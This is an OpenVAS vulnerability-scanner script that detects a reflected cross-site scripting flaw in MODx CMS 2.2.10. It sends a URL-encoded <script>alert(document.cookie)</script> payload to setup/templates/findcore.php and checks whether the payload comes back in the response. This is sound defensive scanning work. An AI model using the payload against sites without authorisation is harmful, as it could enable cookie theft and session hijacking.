###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_modx_cms_xss_vuln.nasl 3557 2016-06-20 08:07:14Z benallard $
#
# MODx CMS Cross Site Scripting Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804124");
  script_version("$Revision: 3557 $");
  script_bugtraq_id(63274);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2016-06-20 10:07:14 +0200 (Mon, 20 Jun 2016) $");
  script_tag(name:"creation_date", value:"2013-10-29 11:49:17 +0530 (Tue, 29 Oct 2013)");
  script_name("MODx CMS Cross Site Scripting Vulnerability");

  script_tag(name : "impact" , value : "Successful exploitation will allow remote attackers to execute arbitrary HTML
  or script code, steal cookie-based authentication credentials and launch
  other attacks.

  Impact Level: Application");
  script_tag(name : "vuldetect" , value : "Send a crafted exploit string via HTTP GET request and check whether it
  is able to read the cookie or not.");
  script_tag(name : "insight" , value : "Flaw exists due to improper sanitization of url, when accessing 'findcore.php'
  and 'xpdo.class.php' scripts.");
  script_tag(name : "solution" , value : "Upgrade to MODx version 2.3.0 or later.
  For updates refer to http://modx.com");
  script_tag(name : "summary" , value : "This host is running MODx CMS and is prone to cross site scripting
  vulnerability");
  script_tag(name : "affected" , value : "MODx version 2.2.10, Other versions may also be affected.");

  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/88208");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Oct/108");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/modx-2210-cross-site-scripting");
  script_summary("Check if MODx CMS is vulnerable to cross site scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
http_port = "";
req = "";
res = "";
url = "";

## Get HTTP Port
http_port = get_http_port(default:80);

## Check Host Supports PHP
if(!can_host_php(port:http_port)){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list_unique("/", "/modx", "/cms", cgi_dirs(port:http_port)))
{

  if( dir == "/" ) dir = "";

  req = http_get(item: dir + "/setup/templates/findcore.php",  port:http_port);
  res = http_keepalive_send_recv(port:http_port, data:req);

  ## confirm the Application
  if(res &&  ">MODX Revolution<" >< res)
  {
    ## Construct Attack Request
    url = dir + "/setup/templates/findcore.php/%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E" ;

    ## Check the response to confirm vulnerability
    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
                       pattern:"<script>alert\(document.cookie\);</script>"))
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
